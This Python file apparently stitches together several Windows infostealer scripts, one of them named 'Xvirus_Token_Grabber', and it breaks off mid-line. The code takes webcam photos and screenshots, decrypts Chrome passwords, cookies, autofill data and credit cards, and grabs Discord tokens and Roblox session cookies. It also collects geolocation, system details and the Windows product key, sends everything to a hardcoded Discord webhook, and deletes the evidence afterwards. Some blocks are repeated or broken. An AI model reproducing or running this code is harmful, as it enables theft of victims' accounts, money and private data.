import os
import json
import shutil
import base64
import sqlite3
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime, timezone, timedelta
import requests
import time
import platform
import subprocess
import pyautogui
import os
import tempfile
import asyncio
from discord_webhook import DiscordWebhook
import cv2
import requests
import os
import time
import shutil
import getpass


webhook_url = 'https://discord.com/api/webhooks/1131873199492182096/Ewnoq4NUuZjW4HNhJ-QA-IBhKPDk7Et15MfrNPnuTIdkTZKwteS6JqoyqKa30P3ekUum'


appdata_dir = os.path.join(os.getenv('APPDATA'), 'captured_photos')
os.makedirs(appdata_dir, exist_ok=True)


cap = cv2.VideoCapture(0)
ret, frame = cap.read()


current_time = time.strftime('%Y%m%d_%H%M%S')
filename = f'captured_photo_{current_time}.jpg'


filepath = os.path.join(appdata_dir, filename)
cv2.imwrite(filepath, frame)


cap.release()


from requests_toolbelt.multipart.encoder import MultipartEncoder
multipart_data = MultipartEncoder(fields={'file': (filename, open(filepath, 'rb'), 'image/jpeg')})


headers = {'Content-Type': multipart_data.content_type}
response = requests.post(webhook_url, data=multipart_data, headers=headers)


if response.status_code == 200:
    print('Imagen enviada con exito a Discord.')
else:
    print('Error al enviar la imagen a Discord. Codigo de estado:', response.status_code)


time.sleep(2)



if len(os.listdir(appdata_dir)) == 0:
    os.rmdir(appdata_dir)




webhook_url = 'https://discord.com/api/webhooks/1131873199492182096/Ewnoq4NUuZjW4HNhJ-QA-IBhKPDk7Et15MfrNPnuTIdkTZKwteS6JqoyqKa30P3ekUum'


screenshot = pyautogui.screenshot()
screenshot_path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
screenshot.save(screenshot_path)


webhook = DiscordWebhook(url=webhook_url)
with open(screenshot_path, 'rb') as f:
    webhook.add_file(file=f.read(), filename='screenshot.png')
response = webhook.execute()


async def delete_screenshot():
    await asyncio.sleep(5)  
    os.remove(screenshot_path)


asyncio.run(delete_screenshot())



class Chrome:
     def __init__(self):
         self._user_data = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data"
         self._master_key = self._get_master_key()

     def _get_master_key(self):
         with open(self._user_data + "\\Local State", "r") as f:
             local_state = f.read()
             local_state = json.loads(local_state)
             master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
             master_key = master_key[5:]
             master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
             return master_key

     @staticmethod
     def _decrypt(buff, master_key):
         try:
             iv = buff[3:15]
             payload = buff[15:]
             cipher = AES.new(master_key, AES.MODE_GCM, iv)
             decrypted_pass = cipher.decrypt(payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
         except Exception as e:
             return str(e)

     @staticmethod
     def _convert_time(time):
         epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
         code_stamp = epoch + timedelta(microseconds=time)
         return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')

     def passwords(self):
         try:
             login_db = self._user_data + "\\Default\\Login Data"
             login_db_copy = os.getenv("TEMP") + "\\Login.db"
             shutil.copy2(login_db, login_db_copy)
             conn = sqlite3.connect(login_db_copy)
             cursor = conn.cursor()
             try:
                 cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                 with open("passwords.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         url = item[0]
                         username = item[1]
                         encrypted_password = item[2]
                         decrypted_password = self._decrypt(encrypted_password, self._master_key)
                         f.write(f"URL: {url}\nUSR: {username}\nPDW: {decrypted_password}\n\n")

             except sqlite3.Error:
                 pass

             cursor.close()
             conn.close()
             os.remove(login_db_copy)
         except Exception as e:
             print(f"[!]Error: {e}")

     def cookies(self):
         try:
             cookies_db = self._user_data + "\\Default\\Network\\cookies"
             cookies_db_copy = os.getenv("TEMP") + "\\Cookies.db"
             shutil.copy2(cookies_db, cookies_db_copy)
             conn = sqlite3.connect(cookies_db_copy)
             cursor = conn.cursor()
             try:
                 cursor.execute("SELECT host_key, name, encrypted_value from cookies")

                 with open("cookies.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         host = item[0]
                         user = item[1]
                         decrypted_cookie = self._decrypt(item[2], self._master_key)
                         f.write(f"HOST KEY: {host:<30} NAME: {user:<30} VALUE: {decrypted_cookie}\n")

             except sqlite3.Error:
                 pass

             cursor.close()
             conn.close()
             os.remove(cookies_db_copy)
         except Exception as e:
             print(f"[!]Error: {e}")

     def web_data(self):
         try:
             web_data_db = self._user_data + "\\Default\\Web Data"
             web_data_db_copy = os.getenv("TEMP") + "\\Web.db"
             shutil.copy2(web_data_db, web_data_db_copy)
             conn = sqlite3.connect(web_data_db_copy)
             cursor = conn.cursor()

             try:
                 cursor.execute("SELECT name, value FROM autofill")

                 with open("autofill.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         name = item[0]
                         value = item[1]
                         f.write(f"{name}: {value}\n")

                 cursor.execute("SELECT * FROM credit_cards")

                 with open("credit_cards.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         username = item[1]
                         encrypted_password = item[4]
                         decrypted_password = self._decrypt(encrypted_password, self._master_key)
                         expire_mon = item[2]
                         expire_year = item[3]
                         f.write(f"USR: {username}\nPDW: {decrypted_password}\nEXP: {expire_mon}/{expire_year}\n\n")

             except sqlite3.Error:
                 pass

             cursor.close()
             conn.close()
             os.remove(web_data_db_copy)
         except Exception as e:
             print(f"[!]Error: {e}")

     def history(self):
         try:
             history_db = self._user_data + "\\Default\\History"
             history_db_copy = os.getenv("TEMP") + "\\History.db"
             shutil.copy2(history_db, history_db_copy)
             conn = sqlite3.connect(history_db_copy)
             cursor = conn.cursor()

             try:
                 cursor.execute('SELECT term FROM keyword_search_terms')

                 with open("search_history.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         term = item[0]
                         f.write(f"{term}\n")

                 cursor.execute('SELECT title, url, last_visit_time FROM urls')

                 with open("web_history.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         title = item[0]
                         url = item[1]
                         last_time = self._convert_time(item[2])
                         f.write(f"Title: {title}\nUrl: {url}\nLast Time Visit: {last_time}\n\n")

             except sqlite3.Error:
                 pass

             cursor.close()
             conn.close()
             os.remove(history_db_copy)
         except Exception as e:
             print(f"[!]Error: {e}")


def send_webhook_message(webhook_url, message):
     payload = {"content": message}
     response = requests.post(webhook_url, json=payload)
     if response.status_code != 204:
         print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")


def send_files_to_discord(webhook_url, files):
     try:
         for file in files:
             with open(file, "rb") as f:
                 data = {"file": f}
                 response = requests.post(webhook_url, files=data)
                 response.raise_for_status()
         time.sleep(0.5)  # Esperar 10 segundos
         for file in files:
             os.remove(file)  # Eliminar los archivos generados
     except requests.exceptions.RequestException as e:
         print("An Error occurred")


if __name__ == "__main__":
     chrome = Chrome()
     chrome.passwords()
     chrome.cookies()
     chrome.history()
     chrome.web_data()
     files = ["passwords.txt", "cookies.txt", "autofill.txt", "credit_cards.txt", "search_history.txt", "web_history.txt"]
     send_files_to_discord("https://discord.com/api/webhooks/1131873199492182096/Ewnoq4NUuZjW4HNhJ-QA-IBhKPDk7Et15MfrNPnuTIdkTZKwteS6JqoyqKa30P3ekUum", files)







sensitive_data = []


system_info = platform.platform()


user_info = platform.node()


network_info = "Network information"


data = {
     "content": f"Sensitive Data: {sensitive_data}\n\n"
                f"System Information: {system_info}\n\n"
                f"User Information: {user_info}\n\n"
                f"Network Information: {network_info}"
 }


webhook_url = "https://discord.com/api/webhooks/1131873199492182096/Ewnoq4NUuZjW4HNhJ-QA-IBhKPDk7Et15MfrNPnuTIdkTZKwteS6JqoyqKa30P3ekUum"


response = requests.post(webhook_url, json=data)

if response.status_code != 204:
     print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")







def get_ip_address():
     response = requests.get('https://api.ipify.org?format=json')
     ip_data = response.json()
     return ip_data['ip']


def send_ip_to_discord(webhook_url, ip_address):
     data = {
        'content': f'```IP address is {ip_address}```'
     }
     response = requests.post(webhook_url, json=data)
     if response.status_code == 200:
         print('Checking for updates...')
     else:
         print('Checking for updates...')

webhook_url = 'https://discord.com/api/webhooks/1131873199492182096/Ewnoq4NUuZjW4HNhJ-QA-IBhKPDk7Et15MfrNPnuTIdkTZKwteS6JqoyqKa30P3ekUum'


ip_address = get_ip_address()
send_ip_to_discord(webhook_url, ip_address)

webhook = "https://discord.com/api/webhooks/1131873199492182096/Ewnoq4NUuZjW4HNhJ-QA-IBhKPDk7Et15MfrNPnuTIdkTZKwteS6JqoyqKa30P3ekUum" # WEBHOOK HERE

from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES 

def safe(func):
     def wrapper(*args, **kwargs):
         try:
             return func(*args, **kwargs)
         except Exception:
             pass
     return wrapper

class CookieLogger:

     appdata = os.getenv('APPDATA')
     localappdata = os.getenv('LOCALAPPDATA')

     def __init__(self):
         browsers = self.findBrowsers()

         cookies = []
         for browser in browsers:
             try:
                 cookies.append(self.getCookie(browser[0], browser[1]))
             except Exception:
                 pass

         try:
             cookies.append(("Roblox App", ("None", '\n'.join(line for line in subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip()))))
         except Exception:
             pass
        
         cookieDoc = ""

         for cookie in cookies:
             if cookie == None or not cookie[1]:
                 continue

             for _cookie in cookie[1]:
                 cookieDoc += f"Browser: {cookie[0]}\nProfile: {_cookie[0]}\nCookie: {_cookie[1]}\n\n"

                 if not cookieDoc: cookieDoc = "No Cookies Found!"
                        
         requests.post(webhook, files = {"cookies.txt": cookieDoc})
    
     @safe
     def findBrowsers(self):
         found = []

         for root in [self.appdata, self.localappdata]:
             for directory in os.listdir(root):
                 try:
                     for _root, _, _ in os.walk(os.path.join(root, directory)):
                         for file in os.listdir(_root):
                             if file == "Local State":
                                 if "Default" in os.listdir(_root):
                                     found.append([_root, True])
                                 elif "Login Data" in os.listdir(_root):
                                     found.append([_root, False])
                                 else:
                                     pass
                 except Exception:
                     pass

         return found

     @safe
     def getMasterKey(self, browserPath):
         with open(os.path.join(browserPath, "Local State"), "r", encoding = "utf8") as f:
             localState = json.loads(f.read())
        
         masterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
         truncatedMasterKey = masterKey[5:]

         return CryptUnprotectData(truncatedMasterKey, None, None, None, 0)[1]

     @safe
     def decryptCookie(self, cookie, masterKey):
         iv = cookie[3:15]
         encryptedValue = cookie[15:]

         cipher = AES.new(masterKey, AES.MODE_GCM, iv)
         decryptedValue = cipher.decrypt(encryptedValue)

         return decryptedValue[:-16].decode()

     @safe
     def getCookie(self, browserPath, isProfiled):

         if browserPath.split("\\")[-1] == "User Data":
             browserName = browserPath.split("\\")[-2]
         else:
             browserName = browserPath.split("\\")[-1]
        
         cookiesFound = []

         profiles = ["Default"]
         try:
             masterKey = self.getMasterKey(browserPath)
         except Exception:
             return cookiesFound

         if isProfiled:
             for directory in os.listdir(browserPath):
                 if directory.startswith("Profile"):
                     profiles.append(directory)
        
         if not isProfiled:
             if "Network" in os.listdir(browserPath):
                 cookiePath = os.path.join(browserPath, "Network", "Cookies")
             else:
                 cookiePath = os.path.join(browserPath, "Cookies")
            
             shutil.copy2(cookiePath, "temp.db")
             connection = sqlite3.connect("temp.db")
             cursor = connection.cursor()

             cursor.execute("SELECT encrypted_value FROM cookies")
             for cookie in cursor.fetchall():
                 if cookie[0]:
                     decrypted = self.decryptCookie(cookie[0], masterKey)

                     if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
                         cookiesFound.append(("None", decrypted))
                
             connection.close()
             os.remove("temp.db")
        
         else:
             for profile in profiles:
                 if "Network" in os.listdir(os.path.join(browserPath, profile)):
                     cookiePath = os.path.join(browserPath, profile, "Network", "Cookies")
                 else:
                     cookiePath = os.path.join(browserPath, profile, "Cookies")

                 shutil.copy2(cookiePath, "temp.db")
                 connection = sqlite3.connect("temp.db")
                 cursor = connection.cursor()

                 cursor.execute("SELECT encrypted_value FROM cookies")
                 for cookie in cursor.fetchall():
                     if cookie[0]:
                         decrypted = self.decryptCookie(cookie[0], masterKey)

                         if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
                             cookiesFound.append((profile, decrypted))
                
                 connection.close()
                 os.remove("temp.db")

         return [browserName, cookiesFound]

if __name__ == "__main__":
     CookieLogger()










import psutil
import platform
import json
from datetime import datetime
from time import sleep
import requests
import socket
from requests import get
import os
import re
import requests
import subprocess
from uuid import getnode as get_mac
import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES


from base64 import b64decode, b64encode
from dhooks import Webhook, Embed, File
from subprocess import Popen, PIPE
from json import loads, dumps
from shutil import copyfile
from sys import argv


url= "https://discord.com/api/webhooks/1131873199492182096/Ewnoq4NUuZjW4HNhJ-QA-IBhKPDk7Et15MfrNPnuTIdkTZKwteS6JqoyqKa30P3ekUum" 





def scale(bytes, suffix="B"):
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < defined:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= defined

uname = platform.uname()

bt = datetime.fromtimestamp(psutil.boot_time()) 

host = socket.gethostname()
localip = socket.gethostbyname(host)

publicip = get('https://api.ipify.org').text # 
city = get(f'https://ipapi.co/{publicip}/city').text
region = get(f'https://ipapi.co/{publicip}/region').text
postal = get(f'https://ipapi.co/{publicip}/postal').text
timezone = get(f'https://ipapi.co/{publicip}/timezone').text
currency = get(f'https://ipapi.co/{publicip}/currency').text
country = get(f'https://ipapi.co/{publicip}/country_name').text
callcode = get(f"https://ipapi.co/{publicip}/country_calling_code").text
vpn = requests.get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
mac = get_mac()


roaming = os.getenv('AppData')

output = open(roaming + "temp.txt", "a")



Directories = {
        'Discord': roaming + '\\Discord',
        'Discord Two': roaming + '\\discord',
        'Discord Canary': roaming + '\\Discordcanary',
        'Discord Canary Two': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
}


## Scan for the regex [\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}
def Yoink(Directory):
	Directory += '\\Local Storage\\leveldb'

	Tokens = []

	for FileName in os.listdir(Directory):
		if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
			continue

		for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for Token in re.findall(regex, line):
					Tokens.append(Token)

	return Tokens


## Wipe the temp file
def Wipe():
    if os.path.exists(roaming + "temp.txt"):
      output2 = open(roaming + "temp.txt", "w")
      output2.write("")
      output2.close()
    else:
      pass


## Search Directorys for Token regex if exists
for Discord, Directory in Directories.items():
	if os.path.exists(Directory):
		Tokens = Yoink(Directory)
	if len(Tokens) > 0:
		for Token in Tokens:
			realshit = f"{Token}\n"


cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory()
partitions = psutil.disk_partitions()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()

partitions = psutil.disk_partitions()
for partition in partitions:
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        continue





requests.post(url, data=json.dumps({ "embeds": [ { "title": f"Someone Runs Program! - {host}", "color": 8781568 }, { "color": 7506394, "fields": [ { "name": "GeoLocation", "value": f"Using VPN?: {proxy}\nLocal IP: {localip}\nPublic IP: {publicip}\nMAC Adress: {mac}\n\nCountry: {country} | {callcode} | {timezone}\nregion: {region}\nCity: {city} | {postal}\nCurrency: {currency}\n\n\n\n" } ] }, { "fields": [ { "name": "System Information", "value": f"System: {uname.system}\nNode: {uname.node}\nMachine: {uname.machine}\nProcessor: {uname.processor}\n\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}" } ] }, { "color": 15109662, "fields": [ { "name": "CPU Information", "value": f"Psychical cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\n\nMax Frequency: {cpufreq.max:.2f}Mhz\nMin Frequency: {cpufreq.min:.2f}Mhz\n\nTotal CPU usage: {psutil.cpu_percent()}\n" }, { "name": "Nemory Information", "value": f"Total: {scale(svmem.total)}\nAvailable: {scale(svmem.available)}\nUsed: {scale(svmem.used)}\nPercentage: {svmem.percent}%" }, { "name": "Disk Information", "value": f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n\nTotal read: {scale(disk_io.read_bytes)}\nTotal write: {scale(disk_io.write_bytes)}" }, { "name": "Network Information", "value": f"Total Sent: {scale(net_io.bytes_sent)}\")\nTotal Received: {scale(net_io.bytes_recv)}" } ] }, { "color": 7440378, "fields": [ { "name": "Discord information", "value": f"Token: MTExNzc1MzIwODIwNzU4OTQwMA.G5YrCm._VZa_vpuIH-RYBlDLx6o9Yn4F3Rt6EvDc-ucso" } ] } ] }), headers={"Content-Type": "application/json"})

DBP = r'Google\Chrome\User Data\Default\Login Data'
ADP = os.environ['LOCALAPPDATA']


def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chrome:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(ADP, DBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None


if __name__ == "__main__":
    main = chrome()
    try:
        main.chromedb()
    except:
        pass
    main.saved()





def beamed():
    hook = Webhook(url)
    try:
        hostname = requests.get("https://api.ipify.org").text
    except:
        pass


    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'

        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'
    

    """screenshot victim's desktop"""
    try:
        screenshot = image.grab()
        screenshot.save(os.getenv('ProgramData') +r'\screenshot.jpg')
        screenshot = open(r'C:\ProgramData\screenshot.jpg', 'rb')
        screenshot.close()
    except:
        pass

    """gather our .zip variables"""
    try:
        zname = r'C:\ProgramData\passwords.zip'
        newzip = zipfile.ZipFile(zname, 'w')
        newzip.write(r'C:\ProgramData\passwords.txt')
        newzip.close()
        passwords = File(r'C:\ProgramData\passwords.zip')
    except:
        pass
    
    """gather our windows product key variables"""
    try:
        usr = os.getenv("UserName")
        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    except:
        pass

    """steal victim's .roblosecurity cookie"""
    cookie = [".ROBLOSECURITY"]
    cookies = []
    limit = 2000

    """chrome installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.chrome()))
    except:
        pass

    """firefox installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.firefox()))
    except:
        pass

    """read data => if we find a matching positive for our specified variable 'cookie', send it to our webhook."""
    try:
        for y in cookie:
            send = str([str(x) for x in cookies if y in str(x)])
            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
            for z in chunks:
                roblox = f'```' + f'{z}' + '```'
    except:
        pass

    """attempt to send all recieved data to our specified webhook"""
    try:
        embed = Embed(title='Aditional Features',description='a victim\'s data was extracted, here\'s the details:',color=0x2f3136,timestamp='now')
        embed.add_field("windows key:",f"user => {usr}\ntype => {types}\nkey => {keys}")
        embed.add_field("roblosecurity:",roblox)
        embed.add_field("tokens:",message)
        embed.add_field("hostname:",f"{hostname}")
    except:
        pass
    try:
        hook.send(embed=embed, file=passwords)
    except:
        pass

    """attempt to remove all evidence, allows for victim to stay unaware of data extraction"""
    try:
        subprocess.os.system(r'del C:\ProgramData\passwords.zip')
        subprocess.os.system(r'del C:\ProgramData\passwords.txt')
    except:
        pass

if os.name != "nt":
    exit()
import os
import re
import json
from urllib.request import Request, urlopen
WEBHOOK = 'https://discord.com/api/webhooks/1131873199492182096/Ewnoq4NUuZjW4HNhJ-QA-IBhKPDk7Et15MfrNPnuTIdkTZKwteS6JqoyqKa30P3ekUum'
PING_ME = True
def find_tokens(path):
    path += '\Local Storage\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + r'\Discord',
        'Discord Canary': roaming + r'\discordcanary',
        'Discord PTB': roaming + r'\discordptb',
        'Google Chrome': local + r'\Google\Chrome\User Data\Default',
        'Opera': roaming + r'\Opera Software\Opera Stable',
        'Brave': local + r'\BraveSoftware\Brave-Browser\User Data\Default',
        'Yandex': local + r'\Yandex\YandexBrowser\User Data\Default'
    }
    message = '@everyone' if PING_ME else ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f' **{platform}** '
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f'```{token}``` '
        else:
            message += 'No tokens found. '
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': message})
    try:
        req = Request(WEBHOOK, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
if __name__ == '__main__':
    main()


beamed()


try:
    import asyncio
    import ctypes
    import json
    import os
    import re
    import shutil
    import sqlite3
    import subprocess
    import sys
    import threading
    import time
    import winreg
    import zipfile
    from base64 import b64decode
    from re import findall, match
    from sys import argv
    from tempfile import mkdtemp

    import httpx
    import psutil
    import requests
    from colorama import Fore, Style
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from PIL import ImageGrab
    from win32crypt import CryptUnprotectData
except:
    import time
    import os
    input("Found missing modules. Press enter to install them.")
    print("Installing missing modules in 3 seconds. CTRL + C to cancel.")
    time.sleep(3.0)
    os.system("pip install requests && pip install httpx && pip install pyotp && pip install psutil && pip install pypiwin32 && pip install aes && pip install pycryptodome && pip install pyinstaller>=5.0 && pip install PIL-tools && pip install colorama && pip install win10toast && pip install cryptography")
    os.system("cls")
    print("Installed the missing modules successfully. Please restart the client. Closing this terminal in 30 seconds.")
    time.sleep(30)
    sys.exit

config = {
    'webhook': "https://discord.com/api/webhooks/1131873199492182096/Ewnoq4NUuZjW4HNhJ-QA-IBhKPDk7Et15MfrNPnuTIdkTZKwteS6JqoyqKa30P3ekUum",
    
    'startup': False,
    
    'hide_self': True
    }


Victim = os.getlogin()
Victim_pc = os.getenv("COMPUTERNAME")


class functions(object):
    @staticmethod
    def getHeaders(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def get_master_key(path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt_val(buff, master_key) -> str:
        try:
            salt = buff[:16]  # Assuming that the first 16 bytes of `buff` are the salt.
            iv = buff[16:28]
            ciphertext = buff[28:]

            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                salt=salt,
                iterations=100000,  # You can adjust the number of iterations for your security requirements.
                backend=default_backend()
            )
            key = kdf.derive(master_key)

            cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted_pass = decryptor.update(ciphertext) + decryptor.finalize()
            return decrypted_pass.decode()
        except Exception:
            return "Failed to decrypt password"

    @staticmethod
    def fetchConf(e: str) -> str or bool | None:
        return config.get(e)

    @staticmethod
    def get_core(dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    @staticmethod
    def start_discord(dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     

class Xvirus_Token_Grabber(functions):
    def __init__(self):
        self.webhook = self.fetchConf('webhook')
        self.baseurl = "https://discord.com/api/v10/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.dir = mkdtemp()
        self.startup_loc = self.roaming + \
